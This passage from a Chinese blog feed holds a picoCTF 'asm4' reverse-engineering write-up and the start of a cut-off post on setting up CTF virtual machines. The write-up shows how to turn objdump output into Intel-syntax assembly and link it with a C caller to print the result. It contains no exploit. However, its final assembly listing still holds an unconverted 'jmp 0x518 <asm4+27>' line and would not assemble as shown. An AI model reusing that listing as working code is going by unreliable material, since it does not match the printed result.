class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">103</span>&gt;: <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">        &lt;+<span class="number">105</span>&gt;: <span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line">        &lt;+<span class="number">108</span>&gt;: <span class="keyword">movsx</span>  <span class="built_in">edx</span>,<span class="built_in">al</span></span><br><span class="line">        &lt;+<span class="number">111</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">114</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">117</span>&gt;: <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">        &lt;+<span class="number">119</span>&gt;: <span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line">        &lt;+<span class="number">122</span>&gt;: <span class="keyword">movsx</span>  <span class="built_in">eax</span>,<span class="built_in">al</span></span><br><span class="line">        &lt;+<span class="number">125</span>&gt;: <span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line">        &lt;+<span class="number">127</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">        &lt;+<span class="number">129</span>&gt;: <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ebx</span></span><br><span class="line">        &lt;+<span class="number">131</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">eax</span></span><br><span class="line">        &lt;+<span class="number">134</span>&gt;: <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line">        &lt;+<span class="number">138</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line">        &lt;+<span class="number">141</span>&gt;: <span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">        &lt;+<span class="number">144</span>&gt;: <span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span></span><br><span class="line">        &lt;+<span class="number">147</span>&gt;: <span class="keyword">jl</span>     <span class="number">0x530</span> &lt;asm4+<span class="number">51</span>&gt;</span><br><span class="line">        &lt;+<span class="number">149</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">        &lt;+<span class="number">152</span>&gt;: <span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">        &lt;+<span class="number">155</span>&gt;: <span class="keyword">pop</span>    <span class="built_in">ebx</span></span><br><span class="line">        &lt;+<span class="number">156</span>&gt;: <span class="keyword">pop</span>    <span class="built_in">ebp</span></span><br><span class="line">        &lt;+<span class="number">157</span>&gt;: <span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><h1 id="解题说明"><a href="#解题说明" class="headerlink" title="解题说明"></a>解题说明</h1><p>  可以看到，要理清这五十多行的汇编代码，还是比较麻烦的。因此理想的方法是直接执行<code>asm4(&quot;picoCTF_a3112&quot;)</code></p><p>  因此一个合理的思路就是在<strong>C</strong>语言中直接进行符号调用即可</p><h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><p>  这个很简单，就是在<strong>C</strong>中调用该导出符号即可，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">asm4</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>, asm4(<span class="string">&quot;picoCTF_a3112&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="汇编代码修改"><a href="#汇编代码修改" class="headerlink" title="汇编代码修改"></a>汇编代码修改</h2><p>  这明显是通过<code>objdump</code>反汇编出来的汇编代码，并且还附带这诸多的标记信息。<br>  我们首先需要将其转换为符合格式的汇编代码，即执行如下几个步骤</p><ol><li>去除代码字节序数</li><li>去除跳转注解</li><li>添加跳转标签，统一为<strong>asm4_<em>字节序数</em></strong></li><li><p>修改跳转地址为相对应的跳转标签</p><p>最后整理完成的汇编代码如下所示</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">asm4:</span></span><br><span class="line"><span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="number">0x246</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line"><span class="keyword">jmp</span>    asm4_27</span><br><span class="line"><span class="symbol">asm4_23:</span></span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x1</span></span><br><span class="line"><span class="symbol">asm4_27:</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">test</span>   <span class="built_in">al</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">jne</span>    asm4_23</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line"><span class="keyword">jmp</span>    asm4_138</span><br><span class="line"><span class="symbol">asm4_51:</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">edx</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">eax</span>-<span class="number">0x1</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">eax</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">ebx</span>,[<span class="built_in">edx</span>+<span class="built_in">eax</span>*<span class="number">1</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">eax</span>+<span class="number">0x1</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">edx</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">eax</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line"><span class="symbol">asm4_138:</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"><span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">jl</span>     asm4_51</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></li></ol><h2 id="生成可执行文件"><a href="#生成可执行文件" class="headerlink" title="生成可执行文件"></a>生成可执行文件</h2><p>  其基本思路很简单——就是将两个部分皆编译、汇编成目标文件，然后进行链接即可，从而生成正常的可执行文件。</p><p>  对于<strong>C</strong>部分，其生成很简单；关键问题在于给定的汇编文件生成目标文件。如果此时直接执行<code>gcc asm4.S</code>，则程序会给出编译错误等信息。</p><p>  其原因也很简单：虽然这是一份正确的汇编代码，但是其使用<strong>Intel</strong>格式书写；而一般编译器默认使用<strong>AT&amp;T</strong>格式进行编译和汇编，从而导致无法正常生成目标文件；除此之外，该汇编代码部分还需要声明其符号，方便进行调用。</p><p>  因此修改过的汇编代码如下所示<br>  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> asm4</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">asm4:</span></span><br><span class="line"><span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="number">0x246</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line"><span class="keyword">jmp</span>    <span class="number">0x518</span> &lt;asm4+<span class="number">27</span>&gt;</span><br><span class="line"><span class="symbol">asm4_23:</span></span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x1</span></span><br><span class="line"><span class="symbol">asm4_27:</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">test</span>   <span class="built_in">al</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">jne</span>    asm4_23</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line"><span class="keyword">jmp</span>    asm4_138</span><br><span class="line"><span class="symbol">asm4_51:</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">edx</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">eax</span>-<span class="number">0x1</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">eax</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">ebx</span>,[<span class="built_in">edx</span>+<span class="built_in">eax</span>*<span class="number">1</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">eax</span>+<span class="number">0x1</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">edx</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="keyword">movsx</span>  <span class="built_in">eax</span>,<span class="built_in">al</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line"><span class="symbol">asm4_138:</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"><span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="keyword">jl</span>     asm4_51</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line"><span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><br>  通过添加上面两个注解，方便编译器等进行编译和链接。</p><p>  其最后编译和链接时，仍需要传递相关的参数，表明采用<strong>Intel</strong>格式的汇编代码，如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c -masm=intel asm4.S</span><br><span class="line">gcc -m32 asm4.S exp.c</span><br></pre></td></tr></table></figure></p><p>  最后执行，结果如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">0x1d0</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf环境配置</title>
      <link href="/2021/07/21/ctf%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/07/21/ctf%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  为了方便，将CTF的环境配置进行总结，方便日后快速恢复环境等</p><h1 id="PWN环境"><a href="#PWN环境" class="headerlink" title="PWN环境"></a>PWN环境</h1><p>  由于一般PWN题目涉及到各种<strong>Glibc</strong>版本，这里搭建多个虚拟机，下面给出主要版本下的虚拟机安装</p><h2 id="ubuntu16-04"><a href="#ubuntu16-04" class="headerlink" title="ubuntu16.04"></a>ubuntu16.04</h2><p>  其安装脚本如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class="line"><span 